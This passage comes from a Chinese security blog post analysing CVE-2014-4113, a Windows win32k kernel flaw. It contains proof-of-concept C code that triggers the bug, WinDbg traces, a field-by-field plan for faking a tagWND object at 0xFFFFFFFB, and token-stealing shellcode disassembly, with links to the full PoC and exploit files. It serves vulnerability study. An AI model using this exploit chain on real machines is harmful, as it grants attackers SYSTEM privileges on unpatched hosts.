+<p><strong>2.添加 消息hook函数（增加 fsHooks 标识）</strong><br><em>SetWindowsHookEx</em> 函数可以满足  </p>
+<p><strong>3.在0x1EB消息发送后修改快捷菜单的窗口过程(ptagwnd-&gt;lpfnWndProc)，并在新的窗口过程函数中返回0xFFFFFFFB</strong><br><em>HOOK CallBacks + SetWindowLongPtr</em> 可以满足     </p>
+<p>下面更新poc代码：  </p>
+<pre><code>LRESULT CALLBACK NewMenuProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
+{
+    if (uMsg == 0x1eb)                
+    {
+        return 0x00000000fffffffb;  //触发漏洞
+    }
+    return DefWindowProc(hwnd, uMsg, wParam, lParam);
+}
+
+LRESULT CALLBACK HookCallback(int code, WPARAM wParam, LPARAM lParam) 
+{
+    CWPSTRUCT *ptag = (CWPSTRUCT*)lParam;
+    if (ptag-&gt;message == 0x1eb) 
+    {
+        SetWindowLongPtr(ptag-&gt;hwnd, GWLP_WNDPROC, (LONG_PTR)NewMenuProc); //替换菜单窗口过程，等会儿win32k会对菜单窗口发消息
+    }
+    return CallNextHookEx(0, code, wParam, lParam);
+}
+
+    SetWindowsHookExA(WH_CALLWNDPROC, HookCallback, NULL, GetCurrentThreadId()); //设置hook域
+</code></pre><p>将程序放进虚拟机，下断点:</p>
+<pre><code>ba e1 win32k!xxxHandleMenuMessages+0x6ac &quot;.if @ecx = 0x204 {.echo ########## WM_RBUTTONDOWN #########} .else{gc}&quot;  
+</code></pre><p>运行程序后，右键点击菜单窗口，成功断下:</p>
+<pre><code>kd&gt; g
+########## WM_RBUTTONDOWN #########
+win32k!xxxHandleMenuMessages+0x6ac:
+fffff960`001a1fbc 81e903020000    sub     ecx,203h
+</code></pre><p>接着下断点检查 win32k!xxxSendMessageTimeout 返回值:</p>
+<pre><code>ba e1 win32k!xxxMNFindWindowFromPoint+0xa2  
+
+kd&gt; g
+win32k!xxxMNFindWindowFromPoint+0xa2:
+fffff960`00162ab2 488bd8          mov     rbx,rax
+kd&gt; r rax
+rax=00000000fffffffb
+</code></pre><p>再次运行后，系统崩溃:  </p>
+<pre><code>FAULTING_IP: 
+win32k!xxxSendMessageTimeout+136
+fffff960`0010a46a 483b5510        cmp     rdx,qword ptr [rbp+10h]
+
+CONTEXT:  fffff88004c58d00 -- (.cxr 0xfffff88004c58d00)
+rax=00000000fffffe0d rbx=0000000000000000 rcx=00000000fffffffb
+rdx=fffff900c2eefc30 rsi=00000000000001ed rdi=0000000000000000
+rip=fffff9600010a46a rsp=fffff88004c596e0 rbp=00000000fffffffb
+ r8=000000000018f7f8  r9=0000000000000000 r10=fffff900c2eefc30
+r11=fffff88004c596c0 r12=0000000000000000 r13=0000000000000000
+r14=000000000018f7f8 r15=0000000000000000
+iopl=0         nv up ei ng nz na po nc
+cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
+win32k!xxxSendMessageTimeout+0x136:
+fffff960`0010a46a 483b5510        cmp     rdx,qword ptr [rbp+10h] ss:0018:00000001`0000000b=????????????????
+</code></pre><p>poc : <a href="https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/poc.cpp" target="_blank" rel="external">https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/poc.cpp</a></p>
+<h3 id="4-EXPLOIT"><a href="#4-EXPLOIT" class="headerlink" title="4. EXPLOIT"></a>4. EXPLOIT</h3><p>在分析过 <em>win32k!xxxSendMessageTimeout</em> 之后，可以注意到窗口过程函数除了运行在用户层之外，如果含有 bServerSideWindowProc， win32k模块会直接调用它的窗口过程函数.</p>
+<pre><code>if (ptagWND-&gt;bServerSideWindowProc)       //检查当前窗口对象的 bServerSideWindowProc 标志位
+    {
+      ......
+      LODWORD(v13) = ptagwnd-&gt;lpfnWndProc(ptagwnd, uMsg, v10, v9); //内核模式下执行 lpfnWndProc 窗口过程
+    }
+</code></pre><p>这里是一个可以被利用的地方，由于这个tagwnd对象的基址是我们通过漏洞构造的0x0`FFFFFFFB,lpfnWndProc 函数指针位于基址加偏移0x90的位置(win7x64下)，所以只要覆盖这个指针，让它指向shellcode地址(win7下不考虑SMAP/SMEP),那么在最后漏洞触发时就有可能实现r0运行r3代码。  </p>
+<p>观察在上面给出的代码(上一节)，要在 <em>win32k!xxxSendMessageTimeout</em> 中直接运行用户层的shellcode主要有以下几个条件:  </p>
+<ol>
+<li>gptiCurrent == ptagWND-&gt;head-&gt;pti  </li>
+<li>ptagWND-&gt;bServerSideWindowProc != 0  </li>
+<li>ptagwnd-&gt;lpfnWndProc == shellcode</li>
+</ol>
+<p>当基址位于 0x0`FFFFFFFB 之后，计算他们的地址位于:  </p>
+<pre><code>kd&gt; dt win32k!tagwnd /r
+   +0x000 head             : _THRDESKHEAD
+      +0x000 h                : Ptr64 Void
+      +0x008 cLockObj         : Uint4B
+      +0x010 pti              : Ptr64 tagTHREADINFO &lt;----- 0x0`FFFFFFFB + 0x10 == = 00000001`0000000b
+      +0x018 rpdesk           : Ptr64 tagDESKTOP
+      +0x020 pSelf            : Ptr64 UChar
+   +0x028 state            : Uint4B
+   +0x028 bHasMeun         : Pos 0, 1 Bit
+   +0x028 bHasVerticalScrollbar : Pos 1, 1 Bit
+   +0x028 bHasHorizontalScrollbar : Pos 2, 1 Bit
+   +0x028 bHasCaption      : Pos 3, 1 Bit
+   +0x028 bSendSizeMoveMsgs : Pos 4, 1 Bit
+   +0x028 bMsgBox          : Pos 5, 1 Bit
+   +0x028 bActiveFrame     : Pos 6, 1 Bit
+   +0x028 bHasSPB          : Pos 7, 1 Bit
+   +0x028 bNoNCPaint       : Pos 8, 1 Bit 
+   +0x028 bSendEraseBackground : Pos 9, 1 Bit
+   +0x028 bEraseBackground : Pos 10, 1 Bit
+   +0x028 bSendNCPaint     : Pos 11, 1 Bit
+   +0x028 bInternalPaint   : Pos 12, 1 Bit
+   +0x028 bUpdateDirty     : Pos 13, 1 Bit
+   +0x028 bHiddenPopup     : Pos 14, 1 Bit
+   +0x028 bForceMenuDraw   : Pos 15, 1 Bit
+   +0x028 bDialogWindow    : Pos 16, 1 Bit
+   +0x028 bHasCreatestructName : Pos 17, 1 Bit
+   +0x028 bServerSideWindowProc : Pos 18, 1 Bit  &lt;----- 0x0`FFFFFFFB + 0x28 + 2 == 00000001`00000025
+   ................................
+   +0x090 lpfnWndProc      : Ptr64        int64  &lt;----- 0x0`FFFFFFFB + 0x90 == 00000001`0000008b
+</code></pre><p>可以看到，在上面的poc中，引发BSOD正是因为在比较pti时，由于内存异常访问引发的</p>
+<pre><code>win32k!xxxSendMessageTimeout+0x136:
+fffff960`0010a46a 483b5510        cmp     rdx,qword ptr [rbp+10h] ss:0018:00000001`0000000b=????????????????
+</code></pre><p>现在，为了利用这个漏洞，需要通过 <em>ntdll</em> 模块中导出的 <em>NtAllocateVirtualMemory</em> 函数先申请 <em>0x00000000FFFFFFFB</em> 位置的内存，并且设置以下地址的数据:<br><strong>00000001`0000000b == pti</strong><br>pti 可以通过TEB结构获取，x64下用户层中，gs:[0x30] 指向TEB</p>
+<pre><code>kd&gt; dt _teb
+ntdll!_TEB
+   +0x000 NtTib            : _NT_TIB
+   +0x038 EnvironmentPointer : Ptr64 Void
+   +0x040 ClientId         : _CLIENT_ID
+   +0x050 ActiveRpcHandle  : Ptr64 Void
+   +0x058 ThreadLocalStoragePointer : Ptr64 Void
+   +0x060 ProcessEnvironmentBlock : Ptr64 _PEB
+   +0x068 LastErrorValue   : Uint4B
+   +0x06c CountOfOwnedCriticalSections : Uint4B
+   +0x070 CsrClientThread  : Ptr64 Void
+   +0x078 Win32ThreadInfo  : Ptr64 Void         &lt;------ pti
+   +0x080 User32Reserved   : [26] Uint4B
+   +0x0e8 UserReserved     : [5] Uint4B
+</code></pre><p><strong>00000001`00000025 == 00000100B == 04H</strong><br>bServerSideWindowProc标志位，表示tagwnd对象的窗口过程能否运行在内核中，这里是固定的就可以了</p>
+<p><strong>00000001`0000008b == shellcode地址</strong><br>关于shellcode 这里就简单的使用system token替换的方式给当前进程提升权限，主要步骤包括：<br>a.得到当前进程的 <em>EPROCESS</em> 对象(x64下，gs指向kpcr)，参考函数 <em>PsGetCurrentProcess</em></p>
+<pre><code>kd&gt; u PsGetCurrentProcess
+nt!PsGetCurrentProcess:
+fffff800`028afbd0 65488b042588010000 mov   rax,qword ptr gs:[188h]
+fffff800`028afbd9 488b4070        mov     rax,qword ptr [rax+70h]
+fffff800`028afbdd c3              ret
+</code></pre><p>b.从 ActiveProcessLinks 中找到进程id是4的system进程.<br>c.将system进程的token替换到当前进程</p>
+<p>更新代码后，运行程序，鼠标放在第一个菜单窗口，当第二个窗口弹出来后，点击窗口，最终由win32k模块直接执行shellcode:</p>
+<pre><code>win32k!xxxSendMessageTimeout+0x26f:
+fffff960`0016a5a3 ff9590000000    call    qword ptr [rbp+90h] ss:0018:00000001`0000008b=00000000ffff0000
+kd&gt; u poi(rbp+90)
+00000000`ffff0000 65488b142588010000 mov   rdx,qword ptr gs:[188h]
+00000000`ffff0009 4c8b4270        mov     r8,qword ptr [rdx+70h]
+00000000`ffff000d 4d8b8888010000  mov     r9,qword ptr [r8+188h]
+00000000`ffff0014 498b09          mov     rcx,qword ptr [r9]
+00000000`ffff0017 488b51f8        mov     rdx,qword ptr [rcx-8]
+00000000`ffff001b 4883fa04        cmp     rdx,4
+00000000`ffff001f 7405            je      00000000`ffff0026
+00000000`ffff0021 488b09          mov     rcx,qword ptr [rcx]
+</code></pre><p>exploit : <a href="https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp" target="_blank" rel="external">https://github.com/B2AHEX/cveXXXX/blob/master/CVE-2014-4113/exploit.cpp</a>  </p>
+<p><img src="/blog/img/src/4113-2.png" alt=""><br><img src="/blog/img/src/4113-3.png" alt="">  </p>
+
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+        <a href="/blog/2017/06/27/利用kaspersky白文件的恶意样本分析/" id="post_nav-older" class="next-content">
+            旧篇
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_forward</i>
+            </button>
+        </a>
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/blog/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/blog/img/avatar.png" alt="b2ahex's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        b2ahex@gmail.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="mailto: b2ahex@gmail.com" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/blog/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/blog/archives/2017/06/">六月 2017<span class="sidebar_archives-count">3</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="https://b2ahex.github.io/blog/whoami" title="whoami">
+                
+                    <i class="material-icons sidebar-material-icons">person</i>
+                
+                whoami
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+    <div class="sidebar-divider"></div>
+
+
+<!-- Theme Material -->
+
+    <a href="https://github.com/viosey/hexo-theme-material"  class="sidebar-footer-text-a" target="_blank">
+        <div class="sidebar-text mdl-button mdl-js-button mdl-js-ripple-effect sidebar-footer-text-div" data-upgraded=",MaterialButton,MaterialRipple">
+            主题 - Material
+            <span class="sidebar-badge badge-circle">i</span>
+        </div>
+    </a>
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/LuckLutz" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>b2ahex's blog
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import File -->
+
+
+    <script>lsloader.load("js/lazyload.min.js","/blog/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
+    <script>lsloader.load("js/js.min.js","/blog/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>
+
+
+
+    <script>lsloader.load("js/nprogress.js","/blog/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/blog/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Window Load-->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+</script>
+
+<!-- MathJax Load-->
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Bing Background -->
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        </body>
+    
+</html>
